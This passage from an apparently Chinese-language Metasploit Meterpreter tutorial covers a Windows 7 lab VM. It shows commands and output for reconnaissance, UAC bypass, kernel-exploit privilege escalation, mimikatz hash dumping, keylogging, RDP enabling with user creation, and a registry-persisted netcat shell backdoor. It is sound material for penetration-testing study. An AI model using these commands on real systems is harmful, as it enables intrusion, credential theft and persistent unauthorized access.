class="line">Nmap done: 1 IP address (1 host up) scanned in 118.08 seconds</span><br></pre></td></tr></table></figure>
<h2><span id="信息收集">信息收集</span></h2><p>信息收集的脚本较多，仅列几个常用的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks   #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie  #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome   #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches  #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain  #查找域控</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/checkvm</span><br><span class="line"></span><br><span class="line">[*] Checking if WIN-7 is a Virtual Machine .....</span><br><span class="line">[+] This is a VMware Virtual Machine</span><br><span class="line">meterpreter &gt; run post/windows/gather/forensics/enum_drives</span><br><span class="line"></span><br><span class="line">Device Name:                    Type:   Size (bytes):</span><br><span class="line">------------                    -----   -------------</span><br><span class="line">&lt;Physical Drives:&gt;</span><br><span class="line">\\.\PhysicalDrive0                   4702111234474983745</span><br><span class="line">&lt;Logical Drives:&gt;</span><br><span class="line">\\.\C:                               4702111234474983745</span><br><span class="line">\\.\D:                               4702111234474983745</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_applications</span><br><span class="line"></span><br><span class="line">[*] Enumerating applications installed on WIN-7</span><br><span class="line"></span><br><span class="line">Installed Applications</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line"> Name                                                            Version</span><br><span class="line"> ----                                                            -------</span><br><span class="line"> Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161  9.0.30729.6161</span><br><span class="line"> Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161  9.0.30729.6161</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Results stored in: /root/.msf4/loot/20181218215218_default_192.168.22.171_host.application_993878.txt</span><br><span class="line">meterpreter &gt; run post/windows/gather/dumplinks</span><br><span class="line"></span><br><span class="line">[*] Running module against WIN-7</span><br><span class="line">[*] Extracting lnk files for user Administrator at C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\...</span><br><span class="line">[*] No Recent Office files found for user Administrator. Nothing to do.</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_domain</span><br><span class="line"></span><br><span class="line">[+] FOUND Domain: uknowsec</span><br><span class="line">[+] FOUND Domain Controller: WIN-0L310JHOGH6 (IP: 192.168.130.130)</span><br></pre></td></tr></table></figure>
<h2><span id="提权">提权</span></h2><h3><span id="getsystem提权">getsystem提权</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br></pre></td></tr></table></figure>
<p><code>getsystem</code>工作原理：</p>
<ol>
<li><code>getsystem</code>创建一个新的<code>Windows</code>服务，设置为<code>SYSTEM</code>运行，当它启动时连接到一个命名管道。</li>
<li><code>getsystem</code>产生一个进程，它创建一个命名管道并等待来自该服务的连接。</li>
<li><code>Windows</code>服务已启动，导致与命名管道建立连接。</li>
<li>该进程接收连接并调用<code>ImpersonateNamedPipeClient</code>，从而为<code>SYSTEM</code>用户创建模拟令牌。</li>
<li>然后用新收集的<code>SYSTEM</code>模拟令牌产生<code>cmd.exe</code>，并且我们有一个<code>SYSTEM</code>特权进程。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: WIN-7\Win7</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:</span><br><span class="line">[-] Named Pipe Impersonation (In Memory/Admin)</span><br><span class="line">[-] Named Pipe Impersonation (Dropper/Admin)</span><br><span class="line">[-] Token Duplication (In Memory/Admin)</span><br></pre></td></tr></table></figure>
<h3><span id="bypassuac">bypassuac</span></h3><p>内置多个<code>pypassuac</code>脚本，原理有所不同，使用方法类似，运行后返回一个新的会话，需要再次执行<code>getsystem</code>获取系统权限，如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/local/bypassuac_eventvwr) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                              Disclosure Date  Rank       Check  Description</span><br><span class="line">   ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   exploit/windows/local/bypassuac                   2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   exploit/windows/local/bypassuac_comhijack         1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   exploit/windows/local/bypassuac_eventvwr          2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   exploit/windows/local/bypassuac_fodhelper         2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   exploit/windows/local/bypassuac_injection         2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)</span><br><span class="line">   exploit/windows/local/bypassuac_injection_winsxs  2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS</span><br><span class="line">   exploit/windows/local/bypassuac_sluihijack        2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   exploit/windows/local/bypassuac_vbs               2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 2...</span><br><span class="line">msf exploit(multi/handler) &gt; use exploit/windows/local/bypassuac</span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; set session 2</span><br><span class="line">session =&gt; 2</span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.22.170:4444 </span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[*] Uploaded the agent to the filesystem....</span><br><span class="line">[*] Uploading the bypass UAC executable to the filesystem...</span><br><span class="line">[*] Meterpreter stager executable 73802 bytes long being uploaded..</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.22.171</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.22.170:4444 -&gt; 192.168.22.171:59068) at 2018-12-18 22:12:04 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: WIN-7\Win7</span><br><span class="line">meterpreter &gt; getsystem </span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">msf exploit(windows/local/bypassuac) &gt; use exploit/windows/local/bypassuac_eventvwr </span><br><span class="line">msf exploit(windows/local/bypassuac_eventvwr) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/bypassuac_eventvwr):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows x86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(windows/local/bypassuac_eventvwr) &gt; set session 2</span><br><span class="line">session =&gt; 2</span><br><span class="line">msf exploit(windows/local/bypassuac_eventvwr) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.22.170:4444 </span><br><span class="line">[*] UAC is Enabled, checking level...</span><br><span class="line">[+] Part of Administrators group! Continuing...</span><br><span class="line">[+] UAC is set to Default</span><br><span class="line">[+] BypassUAC can bypass this setting, continuing...</span><br><span class="line">[*] Configuring payload and stager registry keys ...</span><br><span class="line">[*] Executing payload: C:\Windows\SysWOW64\eventvwr.exe</span><br><span class="line">[+] eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.22.171</span><br><span class="line">[*] Meterpreter session 4 opened (192.168.22.170:4444 -&gt; 192.168.22.171:59075) at 2018-12-18 22:25:01 -0500</span><br><span class="line">[*] Cleaning up registry keys ...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: WIN-7\Win7</span><br><span class="line">meterpreter &gt; getsystem </span><br><span class="line">...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
<h3><span id="内核漏洞提权">内核漏洞提权</span></h3><p>可先利用<code>enum_patches</code>模块收集补丁信息，然后查找可用的<code>exploits</code>进行提权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[+] KB2871997 is missing</span><br><span class="line">[+] KB2928120 is missing</span><br><span class="line">[+] KB977165 - Possibly vulnerable to MS10-015 kitrap0d if Windows 2K SP4 - Windows 7 (x86)</span><br><span class="line">[+] KB2305420 - Possibly vulnerable to MS10-092 schelevator if Vista, 7, and 2008</span><br><span class="line">[+] KB2592799 - Possibly vulnerable to MS11-080 afdjoinleaf if XP SP2/SP3 Win 2k3 SP2</span><br><span class="line">[+] KB2778930 - Possibly vulnerable to MS13-005 hwnd_broadcast, elevates from Low to Medium integrity</span><br><span class="line">[+] KB2850851 - Possibly vulnerable to MS13-053 schlamperei if x86 Win7 SP0/SP1</span><br><span class="line">[+] KB2870008 - Possibly vulnerable to MS13-081 track_popup_menu if x86 Windows 7 SP0/SP1</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; use exploit/windows/local/ms10_092_schelevator </span><br><span class="line">msf exploit(windows/local/ms10_092_schelevator) &gt; set session 5</span><br><span class="line">session =&gt; 5</span><br><span class="line">msf exploit(windows/local/ms10_092_schelevator) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.22.170:4444 </span><br><span class="line">[*] Preparing payload at C:\Users\Win7\AppData\Local\Temp\IsamdcUIQQzv.exe</span><br><span class="line">[*] Creating task: lk6j4xdPvbMB</span><br><span class="line">[*] �ɹ�: �ɹ������ƻ����� &quot;lk6j4xdPvbMB&quot;��</span><br><span class="line">[*] SCHELEVATOR</span><br><span class="line">[*] Reading the task file contents from C:\Windows\system32\tasks\lk6j4xdPvbMB...</span><br><span class="line">[*] Original CRC32: 0xd75a78d9</span><br><span class="line">[*] Final CRC32: 0xd75a78d9</span><br><span class="line">[*] Writing our modified content back...</span><br><span class="line">[*] Validating task: lk6j4xdPvbMB</span><br><span class="line">[*] ����: �޷���������Դ��</span><br><span class="line">[*] Disabling the task...</span><br><span class="line">[*] �ɹ�: �����˼ƻ����� &quot;lk6j4xdPvbMB&quot; �Ĳ�����</span><br><span class="line">[*] SCHELEVATOR</span><br><span class="line">[*] Enabling the task...</span><br><span class="line">[*] �ɹ�: �����˼ƻ����� &quot;lk6j4xdPvbMB&quot; �Ĳ�����</span><br><span class="line">[*] SCHELEVATOR</span><br><span class="line">[*] Executing the task...</span><br><span class="line">[*] �ɹ�: �������� &quot;lk6j4xdPvbMB&quot;��</span><br><span class="line">[*] SCHELEVATOR</span><br><span class="line">[*] Deleting the task...</span><br><span class="line">[*] Sending stage (179779 bytes) to 192.168.22.171</span><br><span class="line">[*] �ɹ�: �ƻ������� &quot;lk6j4xdPvbMB&quot; ���ɹ�ɾ����</span><br><span class="line">[*] SCHELEVATOR</span><br><span class="line">[*] Meterpreter session 6 opened (192.168.22.170:4444 -&gt; 192.168.22.171:50044) at 2018-12-18 23:00:31 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>
<h2><span id="mimikatz抓取密码">mimikatz抓取密码</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz 查看帮助</span><br><span class="line">wdigest  #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz </span><br><span class="line">Loading extension mimikatz...[!] Loaded x86 Mimikatz on an x64 architecture.</span><br><span class="line"></span><br><span class="line">[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7600).). Did you mean to &apos;load kiwi&apos; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID     Package    Domain        User           Password</span><br><span class="line">------     -------    ------        ----           --------</span><br><span class="line">0;4181124  NTLM       WIN-7         Administrator  mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)</span><br><span class="line">0;362944   NTLM       WIN-7         Win7           mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)</span><br><span class="line">0;362915   NTLM       WIN-7         Win7           mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)</span><br><span class="line">0;997      Negotiate  NT AUTHORITY  LOCAL SERVICE  mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)</span><br><span class="line">0;996      Negotiate  UKNOWSEC      WIN-7$         mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)</span><br><span class="line">0;47330    NTLM                                    mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)</span><br><span class="line">0;999      Negotiate  UKNOWSEC      WIN-7$         mod_process::getVeryBasicModulesListForProcess : (0x0000012b) Ō�� ReadProcessMemory  WriteProcessMemory �B n.a. (wdigest KO)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br><span class="line">Ordinateur : win-7.uknowsec.cn</span><br><span class="line">BootKey    : 3a0c900d7f8d17e229f42745cc605dfe</span><br><span class="line"></span><br><span class="line">Rid  : 500</span><br><span class="line">User : Administrator</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 45a524862326cb9e7d85af4017a000f0</span><br><span class="line"></span><br><span class="line">Rid  : 501</span><br><span class="line">User : Guest</span><br><span class="line">LM   : </span><br><span class="line">NTLM : </span><br><span class="line"></span><br><span class="line">Rid  : 1001</span><br><span class="line">User : Win7</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 31d6cfe0d16ae931b73c59d7e0c089c0</span><br></pre></td></tr></table></figure>
<h2><span id="远程桌面amp截屏">远程桌面&amp;截屏</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enumdesktops  #查看可用的桌面</span><br><span class="line">getdesktop    #获取当前meterpreter 关联的桌面</span><br><span class="line">set_desktop   #设置meterpreter关联的桌面  -h查看帮助</span><br><span class="line">screenshot  #截屏</span><br><span class="line">use espia  #或者使用espia模块截屏  然后输入screengrab</span><br><span class="line">run vnc  #使用vnc远程桌面连接</span><br></pre></td></tr></table></figure>
<h2><span id="开启rdpamp添加用户">开启rdp&amp;添加用户</span></h2><h4><span id="getgui命令">getgui命令</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run getgui –h #查看帮助</span><br><span class="line">run getgui -e #开启远程桌面</span><br><span class="line">run getgui -u lltest2 -p 123456   #添加用户</span><br><span class="line">run getgui -f 6661 –e   #3389端口转发到6661</span><br></pre></td></tr></table></figure>
<ol>
<li><code>getgui</code> 系统不推荐，推荐使用<code>run post/windows/manage/enable_rdp</code></li>
<li><code>getgui</code>添加用户时，有时虽然可以成功添加用户，但是没有权限通过远程桌面登陆</li>
</ol>
<h4><span id="enable_rdp脚本">enable_rdp脚本</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp  #开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662  #将3389端口转发到6662</span><br></pre></td></tr></table></figure>
<p>脚本位于<code>/usr/share/metasploit-framework/modules/post/windows/manage/enable_rdp.rb</code><br>通过<code>enable_rdp.rb</code>脚本可知：开启<code>rdp</code>是通过<code>reg</code>修改注册表；添加用户是调用<code>cmd.exe</code>通过<code>net user</code>添加；端口转发是利用的<code>portfwd</code>命令</p>
<h2><span id="键盘记录">键盘记录</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keyscan_start  #开始键盘记录</span><br><span class="line">keyscan_dump   #导出记录数据</span><br><span class="line">keyscan_stop #结束键盘记录</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; keyscan_start</span><br><span class="line">Starting the keystroke sniffer ...</span><br><span class="line">meterpreter &gt; keyscan_dump</span><br><span class="line">Dumping captured keystrokes...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; keyscan_stop</span><br><span class="line">Stopping the keystroke sniffer...</span><br></pre></td></tr></table></figure>
<h2><span id="sniffer抓包">sniffer抓包</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #查看网卡</span><br><span class="line">sniffer_start 2   #选择网卡 开始抓包</span><br><span class="line">sniffer_stats 2   #查看状态</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包</span><br><span class="line">sniffer_stop 2   #停止抓包</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use sniffer</span><br><span class="line">Loading extension sniffer...Success.</span><br><span class="line">meterpreter &gt; sniffer_interfaces</span><br><span class="line"></span><br><span class="line">1 - &apos;WAN Miniport (Network Monitor)&apos; ( type:3 mtu:1514 usable:true dhcp:false wifi:false )</span><br><span class="line">2 - &apos;Intel(R) PRO/1000 MT Network Connection&apos; ( type:0 mtu:1514 usable:true dhcp:true wifi:false )</span><br><span class="line">3 - &apos;Intel(R) PRO/1000 MT Network Connection&apos; ( type:0 mtu:1514 usable:true dhcp:true wifi:false )</span><br></pre></td></tr></table></figure>
<h2><span id="注册表操作">注册表操作</span></h2><h3><span id="注册表基本命令">注册表基本命令</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg –h</span><br><span class="line">    -d   注册表中值的数据.    -k   注册表键路径    -v   注册表键名称</span><br><span class="line">    enumkey 枚举可获得的键    setval 设置键值    queryval 查询键值数据</span><br></pre></td></tr></table></figure>
<h3><span id="注册表设置nc后门">注册表设置nc后门</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &apos;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&apos; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值</span><br><span class="line"></span><br><span class="line">nc -v 192.168.159.144 443  #攻击者连接nc后门</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32</span><br><span class="line">[*] uploading  : /usr/share/windows-binaries/nc.exe -&gt; C:\windows\system32</span><br><span class="line">[*] uploaded   : /usr/share/windows-binaries/nc.exe -&gt; C:\windows\system32\nc.exe</span><br><span class="line">meterpreter &gt; reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</span><br><span class="line">Enumerating: HKLM\software\microsoft\windows\currentversion\run</span><br><span class="line"></span><br><span class="line">  Values (1):</span><br><span class="line"></span><br><span class="line">	VMware User Process</span><br><span class="line"></span><br><span class="line">meterpreter &gt; reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &apos;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&apos;</span><br><span class="line">Successfully set lltest_nc of REG_SZ.</span><br><span class="line">meterpreter &gt; reg queryval -k 